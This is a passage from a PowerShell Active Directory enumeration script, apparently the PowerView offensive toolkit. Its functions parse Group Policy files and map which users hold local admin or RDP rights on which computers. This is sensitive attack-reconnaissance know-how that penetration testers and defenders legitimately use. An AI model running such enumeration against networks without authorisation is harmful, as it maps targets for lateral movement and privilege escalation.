        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=fTDfs))"

            $DFSsearcher.PageSize = 200

            $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                $Properties = $_.Properties
                $RemoteNames = $Properties.remoteservername

                $DFSshares += $RemoteNames | ForEach-Object {
                    try {
                        if ( $_.Contains('\') ) {
                            $DFSshare = New-Object PSObject
                            $DFSshare | Add-Member Noteproperty 'Name' $Properties.name[0]
                            $DFSshare | Add-Member Noteproperty 'RemoteServerName' $_.split("\")[2]
                            $DFSshare
                        }
                    }
                    catch {
                        Write-Debug "Error in parsing DFS share : $_"
                    }
                }
            }
            $DFSshares | Sort-Object -Property "RemoteServerName"
        }
    }

    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=msDFS-Linkv2))"
            $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
            $DFSsearcher.PageSize = 200

            $DFSSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                $Properties = $_.Properties
                $target_list = $Properties.'msdfs-targetlistv2'[0]
                $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                    try {
                        $Target = $_.InnerText
                        if ( $Target.Contains('\') ) {
                            $DFSroot = $Target.split("\")[3]
                            $ShareName = $Properties.'msdfs-linkpathv2'[0]
                            $DFSshare = New-Object PSObject
                            $DFSshare | Add-Member Noteproperty 'Name' "$DFSroot$ShareName"
                            $DFSshare | Add-Member Noteproperty 'RemoteServerName' $Target.split("\")[2]
                            $DFSshare
                        }
                    }
                    catch {
                        Write-Debug "Error in parsing target : $_"
                    }
                }
            }
            $DFSshares | Sort-Object -Unique -Property "RemoteServerName"
        }
    }

    $DFSshares = @()
    
    if ( ($Version -eq "all") -or ($Version.endsWith("1")) ) {
        $DFSshares += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath
    }
    if ( ($Version -eq "all") -or ($Version.endsWith("2")) ) {
        $DFSshares += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath
    }

    $DFSshares | Sort-Object -Property "RemoteServerName"
}


########################################################
#
# GPO related functions.
#
########################################################

function Get-GptTmpl {
<#
    .SYNOPSIS

        Helper to parse a GptTmpl.inf policy file path into a custom object.

    .PARAMETER GptTmplPath

        The GptTmpl.inf file path name to parse. 

    .EXAMPLE

        PS C:\> Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

        Parse the default domain policy .inf for dev.testlab.local
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [String]
        $GptTmplPath
    )

    $SectionName = ''
    $SectionsTemp = @{}
    $SectionsFinal = @{}

    try {

        if(Test-Path $GptTmplPath) {

            Write-Verbose "Parsing $GptTmplPath"

            Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {
                if ($_ -match '\[') {
                    # this signifies that we're starting a new section
                    $SectionName = $_.trim('[]') -replace ' ',''
                }
                elseif($_ -match '=') {
                    $Parts = $_.split('=')
                    $PropertyName = $Parts[0].trim()
                    $PropertyValues = $Parts[1].trim()

                    if($PropertyValues -match ',') {
                        $PropertyValues = $PropertyValues.split(',')
                    }

                    if(!$SectionsTemp[$SectionName]) {
                        $SectionsTemp.Add($SectionName, @{})
                    }

                    # add the parsed property into the relevant Section name
                    $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )
                }
            }

            ForEach ($Section in $SectionsTemp.keys) {
                # transform each nested hash table into a custom object
                $SectionsFinal[$Section] = New-Object PSObject -Property $SectionsTemp[$Section]
            }

            # transform the parent hash table into a custom object
            New-Object PSObject -Property $SectionsFinal
        }
    }
    catch {
        Write-Debug "Error parsing $GptTmplPath : $_"
    }
}


function Get-NetGPO {
<#
    .SYNOPSIS

        Gets a list of all current GPOs in a domain.

    .PARAMETER GPOname

        The GPO name to query for, wildcards accepted.   

    .PARAMETER DisplayName

        The GPO display name to query for, wildcards accepted.   

    .PARAMETER Domain

        The domain to query for GPOs, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"

    .EXAMPLE

        PS C:\> Get-NetGPO -Domain testlab.local
        
        Returns the GPOs in the 'testlab.local' domain. 
#>
    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [String]
        $ADSpath
    )

    $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if ($GPOSearcher) {
        if($DisplayName) {
            $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))"
        }
        else {
            $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"
        }

        $GPOSearcher.PageSize = 200

        $GPOSearcher.FindAll() | ForEach-Object {
            $Properties = $_.Properties
            
            $GPO = New-Object PSObject

            $Properties.PropertyNames | ForEach-Object {
                if($_ -eq "objectguid") {
                    # convert the GUID to a string
                    $GPO | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                }
                elseif ($Properties[$_].count -eq 1) {
                    $GPO | Add-Member Noteproperty $_ $Properties[$_][0]
                }
                else {
                    $GPO | Add-Member Noteproperty $_ $Properties[$_]
                }
            }
            $GPO
        }
    }
}


function Get-NetGPOGroup {
<#
    .SYNOPSIS

        Returns all GPOs in a domain that set "Restricted Groups"
        or use groups.xml on on target machines.

    .PARAMETER GPOname

        The GPO name to query for, wildcards accepted.   

    .PARAMETER DisplayName

        The GPO display name to query for, wildcards accepted.   

    .PARAMETER Domain

        The domain to query for GPOs, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"

    .EXAMPLE

        PS C:\> Get-NetGPOGroup

        Get all GPOs that set local groups on the current domain.
#>

    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath
    )

    # get every GPO from the specified domain with restricted groups set
    Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath | Foreach-Object {

        $Memberof = $Null
        $Members = $Null
        $GPOdisplayName = $_.displayname
        $GPOname = $_.name
        $GPOPath = $_.gpcfilesyspath

        # parse the GptTmpl.inf 'Restricted Groups' file if it exists
        $INFpath = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
        $Inf = Get-GptTmpl $INFpath

        if($Inf.GroupMembership) {

            $Memberof = $Inf.GroupMembership | Get-Member *Memberof | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
            $Members = $Inf.GroupMembership | Get-Member *Members | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }

            # only return an object if Members are found
            if ($Members -or $Memberof) {

                # if there is no Memberof defined, assume local admins
                if(!$Memberof) {
                    $Memberof = 'S-1-5-32-544'
                }
                if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}

                $GPO = New-Object PSObject
                $GPO | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $GPO | Add-Member Noteproperty 'GPOName' $GPOName
                $GPO | Add-Member Noteproperty 'GPOPath' $INFpath
                $GPO | Add-Member Noteproperty 'Filters' $Null
                $GPO | Add-Member Noteproperty 'MemberOf' $Memberof
                $GPO | Add-Member Noteproperty 'Members' $Members
                $GPO
            }
        }

        # parse the Groups.xml file if it exists
        $GroupsXMLPath = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
        if(Test-Path $GroupsXMLPath) {

            [xml] $GroupsXMLcontent = Get-Content $GroupsXMLPath

            # process all group properties in the XML
            $GroupsXMLcontent | Select-Xml "//Group" | Select-Object -ExpandProperty node | ForEach-Object {


                $Members = @()
                $MemberOf = @()

                # extract the localgroup sid for memberof
                $LocalSid = $_.Properties.GroupSid
                if(!$LocalSid) {
                    if($_.Properties.groupName -match 'Administrators') {
                        $LocalSid = 'S-1-5-32-544'
                    }
                    elseif($_.Properties.groupName -match 'Remote Desktop') {
                        $LocalSid = 'S-1-5-32-555'
                    }
                    else {
                        $LocalSid = $_.Properties.groupName
                    }
                }
                $MemberOf = @($LocalSid)

                $_.Properties.members | ForEach-Object {
                    # process each member of the above local group
                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {

                        if($_.sid) {
                            $Members += $_.sid
                        }
                        else {
                            # just a straight local account name
                            $Members += $_.name
                        }
                    }
                }

                if ($Members -or $Memberof) {

                    # extract out any/all filters...I hate you GPP
                    $Filters = $_.filters | ForEach-Object {
                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                            $Filter = New-Object PSObject
                            $Filter | Add-Member Noteproperty 'Type' $_.LocalName
                            $Filter | Add-Member Noteproperty 'Value' $_.name 
                            $Filter
                        }
                    }

                    $GPO = New-Object PSObject
                    $GPO | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $GPO | Add-Member Noteproperty 'GPOName' $GPOName
                    $GPO | Add-Member Noteproperty 'GPOPath' $GroupsXMLPath
                    $GPO | Add-Member Noteproperty 'Filters' $Filters
                    $GPO | Add-Member Noteproperty 'MemberOf' $Memberof
                    $GPO | Add-Member Noteproperty 'Members' $Members
                    $GPO
                }
            }
        }
    }
}


function Find-GPOLocation {
<#
    .SYNOPSIS

        Takes a user/group name and optional domain, and determines 
        the computers in the domain the user/group has local admin 
        (or RDP) rights to.

        It does this by:
            1.  resolving the user/group to its proper sid
            2.  enumerating all groups the user/group is a current part of 
                and extracting all target SIDs to build a target SID list
            3.  pulling all GPOs that set 'Restricted Groups' by calling
                Get-NetGPOGroup
            4.  matching the target sid list to the queried GPO SID list
                to enumerate all GPO the user is effectively applied with
            5.  enumerating all OUs and sites and applicable GPO GUIs are
                applied to through gplink enumerating
            6.  querying for all computers under the given OUs or sites

    .PARAMETER UserName

        A (single) user name name to query for access.

    .PARAMETER GroupName

        A (single) group name name to query for access. 

    .PARAMETER Domain

        Optional domain the user exists in for querying, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER LocalGroup

        The local group to check access against.
        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
        or a custom local SID. Defaults to local 'Administrators'.

    .EXAMPLE

        PS C:\> Find-GPOLocation -UserName dfm
        
        Find all computers that dfm user has local administrator rights to in 
        the current domain.

    .EXAMPLE

        PS C:\> Find-GPOLocation -UserName dfm -Domain dev.testlab.local
        
        Find all computers that dfm user has local administrator rights to in 
        the dev.testlab.local domain.

    .EXAMPLE

        PS C:\> Find-GPOLocation -UserName jason -LocalGroup RDP
        
        Find all computers that jason has local RDP access rights to in the domain.
#>

    [CmdletBinding()]
    Param (
        [String]
        $UserName,

        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $LocalGroup = 'Administrators'
    )

    if($UserName) {

        $User = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController
        $UserSid = $User.objectsid

        if(!$UserSid) {    
            Throw "User '$UserName' not found!"
        }

        $TargetSid = $UserSid
        $ObjectDistName = $User.distinguishedname
    }
    elseif($GroupName) {

        $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData
        $GroupSid = $Group.objectsid

        if(!$GroupSid) {    
            Throw "Group '$GroupName' not found!"
        }

        $TargetSid = $GroupSid
        $ObjectDistName = $Group.distinguishedname
    }
    else {
        throw "-UserName or -GroupName must be specified!"
    }

    if($LocalGroup -like "*Admin*") {
        $LocalSID = "S-1-5-32-544"
    }
    elseif ( ($LocalGroup -like "*RDP*") -or ($LocalGroup -like "*Remote*") ) {
        $LocalSID = "S-1-5-32-555"
    }
    elseif ($LocalGroup -like "S-1-5*") {
        $LocalSID = $LocalGroup
    }
    else {
        throw "LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' type sid."
    }

    Write-Verbose "LocalSid: $LocalSID"
    Write-Verbose "TargetSid: $TargetSid"
    Write-Verbose "TargetObjectDistName: $ObjectDistName"

    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }

    # recurse 'up', getting the the groups this user is an effective member of
    #   thanks @meatballs__ for the efficient example in Get-NetGroup !
    $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController
    $GroupSearcher.filter = "(&(objectClass=group)(member:1.2.840.113556.1.4.1941:=$ObjectDistName))"

    $GroupSearcher.FindAll() | ForEach-Object {
        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier(($_.properties.objectsid)[0],0)).Value
        $TargetSid += $GroupSid
    }

    Write-Verbose "Effective target sids: $TargetSid"

    # get all GPO groups, and filter on ones that match our target SID list
    #   and match the target local sid memberof list
    $GPOgroups = Get-NetGPOGroup -Domain $Domain -DomainController $DomainController | ForEach-Object {
        if ($_.members) {
            $_.members = $_.members | Where-Object {$_} | ForEach-Object {
                if($_ -match "S-1-5") {
                    $_
                }
                else {
                    # if there are any plain group names, try to resolve them to sids
                    Convert-NameToSid $_ -Domain $domain
                }
            }

            # stop PowerShell 2.0's string stupid unboxing
            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            
            if($_.members) {
                try {
                    # only return groups that contain a target sid
                    if( (Compare-Object $_.members $TargetSid -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $LocalSid) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug "Error comparing members and $TargetSid : $_"
                }
            }
        }
    }

    Write-Verbose "GPOgroups: $GPOgroups"
    $ProcessedGUIDs = @{}

    # process the matches and build the result objects
    $GPOgroups | ForEach-Object {

        $GPOguid = $_.GPOName

        if( -not $ProcessedGUIDs[$GPOguid] ) {
            $GPOname = $_.GPODisplayName
            $Filters = $_.Filters

            # find any OUs that have this GUID applied
            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData | ForEach-Object {

                if($Filters) {
                    # filter for computer name/org unit if a filter is specified
                    #   TODO: handle other filters?
                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -FullData | Where-Object {
                        $_.adspath -match ($Filters.Value)
                    } | ForEach-Object { $_.dnshostname }
                }
                else {
                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath
                }
                $GPOLocation = New-Object PSObject
                $GPOLocation | Add-Member Noteproperty 'Object' $ObjectDistName
                $GPOLocation | Add-Member Noteproperty 'GPOname' $GPOname
                $GPOLocation | Add-Member Noteproperty 'GPOguid' $GPOguid
                $GPOLocation | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                $GPOLocation | Add-Member Noteproperty 'Computers' $OUComputers
                $GPOLocation
            }

            # find any sites that have this GUID applied
            # TODO: fix, this isn't the correct way to query computers from a site...
            # Get-NetSite -GUID $GPOguid -FullData | %{
            #     if($Filters) {
            #         # filter for computer name/org unit if a filter is specified
            #         #   TODO: handle other filters?
            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath -FullData | ? {
            #             $_.adspath -match ($Filters.Value)
            #         } | %{$_.dnshostname}
            #     }
            #     else {
            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
            #     }

            #     $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
            #     $out = New-Object PSObject
            #     $out | Add-Member Noteproperty 'Object' $ObjectDistName
            #     $out | Add-Member Noteproperty 'GPOname' $GPOname
            #     $out | Add-Member Noteproperty 'GPOguid' $GPOguid
            #     $out | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
            #     $out | Add-Member Noteproperty 'Computers' $OUComputers
            #     $out
            # }

            # mark off this GPO GUID so we don't process it again if there are dupes
            $ProcessedGUIDs[$GPOguid] = $True
        }
    }
}


function Find-GPOComputerAdmin {
<#
    .SYNOPSIS

        Takes a computer (or GPO) object and determines what users/groups have 
        administrative access over it.
        Inverse of Find-GPOLocation.

    .PARAMETER ComputerName

        The computer to determine local administrative access to.

    .PARAMETER OUName

        OU name to determine who has local adminisrtative acess to computers
        within it. 

    .PARAMETER Domain

        Optional domain the computer/OU exists in, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER Recurse

        Switch. If a returned member is a group, recurse and get all members.

    .PARAMETER LocalGroup

        The local group to check access against.
        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
        or a custom local SID.
        Defaults to local 'Administrators'.

    .EXAMPLE

        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local
        
        Finds users who have local admin rights over WINDOWS3 through GPO correlation.

    .EXAMPLE

        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local -LocalGroup RDP
        
        Finds users who have RDP  rights over WINDOWS3 through GPO correlation.
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [String]
        $ComputerName,

        [String]
        $OUName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $Recurse,

        [String]
        $LocalGroup = 'Administrators'
    )

    $TargetComputer = Get-NetComputer -HostName $ComputerName -Domain $Domain -DomainController $DomainController -FullData    

    if(!$TargetComputer) {
        throw "Computer $ComputerName in domain '$Domain' not found!"
    }

    # extract all OUs a computer is a part of
    # $a = "CN=WINDOWS4,OU=blah,OU=TestMachines,DC=dev,DC=testlab,DC=local"
    $DN = $TargetComputer.distinguishedname

    $TargetOUs = $DN.split(",") | Foreach-Object {
        if($_.startswith("OU=")) {
            $DN.substring($DN.indexof($_))
        }
    }

    Write-Verbose "Target OUs: $TargetOUs"

    $TargetOUs | Where-Object {$_} | Foreach-Object {

        $OU = $_

        # for each OU the computer is a part of, get the full OU object
        $GPOgroups = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData | Foreach-Object { 
            # and then get any GPO links
            $_.gplink.split("][") | Foreach-Object {
                if ($_.startswith("LDAP")) {
                    $_.split(";")[0]
                }
            }
        } | Foreach-Object {
            # for each GPO link, get any locally set user/group SIDs
            Get-NetGPOGroup -Domain $Domain -ADSpath $_
        }

        # for each found GPO group, resolve the SIDs of the members
        $GPOgroups | Foreach-Object {
            $GPO = $_
            $GPO.members | Foreach-Object {

                # resolvethis SID to a domain object
                $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_

                $GPOComputerAdmin = New-Object PSObject
                $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $TargetComputer.dnshostname
                $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU
                $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $Object.name
                $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_
                $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -match '268435456')
                $GPOComputerAdmin 

                # if we're recursing and the current result object is a group
                if($Recurse -and $out.isGroup) {

                    Get-NetGroupMember -SID $_ -FullData -Recurse | Foreach-Object {

                        $out = New-Object PSObject
                        $out | Add-Member Noteproperty 'Server' $name

                        $MemberDN = $_.distinguishedName

                        # extract the FQDN from the Distinguished Name
                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                        if ($_.samAccountType -ne "805306368") {
                            $MemberIsGroup = $True
                        }
                        else {
                            $MemberIsGroup = $False
                        }

                        if ($_.samAccountName) {
                            # forest users have the samAccountName set
                            $MemberName = $_.samAccountName
                        }
                        else {
                            # external trust users have a SID, so convert it
                            try {
                                $MemberName = Convert-SidToName $_.cn
                            }
                            catch {
                                # if there's a problem contacting the domain to resolve the SID
                                $MemberName = $_.cn
                            }
                        }

                        $GPOComputerAdmin = New-Object PSObject
                        $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $TargetComputer.dnshostname
                        $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU
                        $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                        $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                        $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $MemberName
                        $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $MemberDN
                        $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_.objectsid
                        $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $MemberIsGroup
                        $GPOComputerAdmin 
                    }
                }
            }
        }
    }
}


function Get-DomainPolicy {
<#
    .SYNOPSIS

        Returns the default domain or DC policy for a given
        domain or domain controller.

        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.

    .PARAMETER GPOname

        The GPO name to query for, wildcards accepted.   

    .PARAMETER Domain

        The domain to query for default policies, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ResolveSids

        Switch. Resolve Sids from a DC policy to object names.

    .EXAMPLE

        PS C:\> Get-NetGPO

        Returns the GPOs in the current domain. 
#>
    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        $Source ="Domain",

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveSids
    )

    if($Source -eq "Domain") {
        # query the given domain for the default domain policy object
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname "{31B2F340-016D-11D2-945F-00C04FB984F9}"
        
        if($GPO) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            # parse the GptTmpl.inf
            Get-GptTmpl $GptTmplPath
        }

    }
    elseif($Source -eq "DC") {
        # query the given domain/dc for the default domain controller policy object
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname "{6AC1786C-016F-11D2-945F-00C04FB984F9}"

        if($GPO) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            # parse the GptTmpl.inf
            Get-GptTmpl $GptTmplPath | Foreach-Object {
                if($ResolveSids) {
                    # if we're resolving sids in PrivilegeRights to names
                    $out = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq 'PrivilegeRights') {

                            $PrivilegeRights = New-Object PSObject
                            # for every nested SID member of PrivilegeRights, try to 
                            #   unpack everything and resolve the SIDs as appropriate
                            $_.Value.psobject.properties | Foreach-Object {

                                $sids = $_.Value | Foreach-Object {
                                    if($_ -isnot [System.Array]) { 
                                        Convert-SidToName $_ 
                                    }
                                    else {
                                        $_ | Foreach-Object { Convert-SidToName $_ }
                                    }
                                }

                                $PrivilegeRights | Add-Member Noteproperty $_.Name $sids
                            }

                            $out | Add-Member Noteproperty 'PrivilegeRights' $PrivilegeRights
                        }
                        else {
                            $out | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $out
                }
                else { $_ }
            }
        }
    }
}



########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls 
# (with PSReflect).
#
########################################################

function Get-NetLocalGroup {
<#
    .SYNOPSIS

        Gets a list of all current users in a specified local group,
        or returns the names of all local groups with -ListGroups.

    .PARAMETER HostName

        The hostname or IP to query for local group users.

    .PARAMETER HostList

        List of hostnames/IPs to query for local group users.

    .PARAMETER GroupName

        The local group name to query for users. If not given, it defaults to "Administrators"

    .PARAMETER ListGroups

        Switch. List all the local groups instead of their members.

    .PARAMETER Recurse

        Switch. If the local member member is a domain group, recursively try to resolve its members to get a list of domain users who can access this machine.

    .EXAMPLE

        > Get-NetLocalGroup

        Returns the usernames that of members of localgroup "Administrators" on the local host.

    .EXAMPLE

        PS C:\> Get-NetLocalGroup -HostName WINDOWSXP

        Returns all the local administrator accounts for WINDOWSXP

    .EXAMPLE

        PS C:\> Get-NetLocalGroup -HostName WINDOWS7 -Resurse 

        Returns all effective local/domain users/groups that can access WINDOWS7 with
        local administrative privileges.

    .EXAMPLE

        PS C:\> Get-NetLocalGroup -HostName WINDOWS7 -ListGroups

        Returns all local groups on the WINDOWS7 host.

    .LINK

        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = 'localhost',

        [String]
        $HostList,

        [String]
        $GroupName,

        [Switch]
        $ListGroups,

        [Switch]
        $Recurse
    )

    begin {
        if ((-not $ListGroups) -and (-not $GroupName)) {
            # resolve the SID for the local admin group - this should usually default to "Administrators"
            $objSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
            $objgroup = $objSID.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($objgroup.Value).Split('\')[1]
        }
    }
    process {

        $Servers = @()

        # if we have a host list passed, grab it
        if($HostList) {
            if (Test-Path -Path $HostList) {
                $Servers = Get-Content -Path $HostList
            }
            else {
                throw "[!] Input file '$HostList' doesn't exist!"
            }
        }
        else {
            # otherwise assume a single host name
            $Servers += Get-NameField $HostName
        }

        # query the specified group using the WINNT provider, and
        # extract fields as appropriate from the results
        ForEach($Server in $Servers)
        {
            try {
                if($ListGroups) {
                    # if we're listing the group names on a remote server
                    $Computer = [ADSI]"WinNT://$Server,computer"

                    $Computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                        $Group = New-Object PSObject
                        $Group | Add-Member Noteproperty 'Server' $Server
                        $Group | Add-Member Noteproperty 'Group' ($_.name[0])
                        $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $Group | Add-Member Noteproperty 'Description' ($_.Description[0])
                        $Group
                    }
                }
                else {
                    # otherwise we're listing the group members
                    $Members = @($([ADSI]"WinNT://$Server/$groupname").psbase.Invoke('Members'))

                    $Members | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'Server' $Server

                        $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')

                        # try to translate the NT4 domain to a FQDN if possible
                        $Name = Convert-NT4toCanonical $AdsPath
                        if($Name) {
                            $FQDN = $Name.split("/")[0]
                            $ObjName = $AdsPath.split("/")[-1]
                            $Name = "$FQDN/$ObjName"
                            $IsDomain = $True
                        }
                        else {
                            $Name = $AdsPath
                            $IsDomain = $False
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name

                        # translate the binary sid to a string
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)

                        # if the account is local, check if it's disabled, if it's domain, always print $False
                        #   TODO: fix this occasinal error?
                        $Member | Add-Member Noteproperty 'Disabled' $( if(-not $IsDomain) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )

                        # check if the member is a group
                        $IsGroup = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $IsDomain
                        if($IsGroup) {
                            $Member | Add-Member Noteproperty 'LastLogin' ""
                        }
                        else {
                            try {
                                $Member | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
                            }
                            catch {
                                $Member | Add-Member Noteproperty 'LastLogin' ""
                            }
                        }
                        $Member

                        # if the result is a group domain object and we're recursing,
                        # try to resolve all the group member results
                        if($Recurse -and $IsDomain -and $IsGroup) {

                            $FQDN = $name.split("/")[0]
                            $GroupName = $name.split("/")[1].trim()

                            Get-NetGroupMember -GroupName $GroupName -Domain $FQDN -FullData -Recurse | ForEach-Object {

                                $Member = New-Object PSObject
                                $Member | Add-Member Noteproperty 'Server' $name

                                $MemberDN = $_.distinguishedName
                                # extract the FQDN from the Distinguished Name
                                $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                                if ($_.samAccountType -ne "805306368") {
                                    $MemberIsGroup = $True
                                }
                                else {
                                    $MemberIsGroup = $False
                                }

                                if ($_.samAccountName) {
                                    # forest users have the samAccountName set
                                    $MemberName = $_.samAccountName
                                }
                                else {
                                    # external trust users have a SID, so convert it
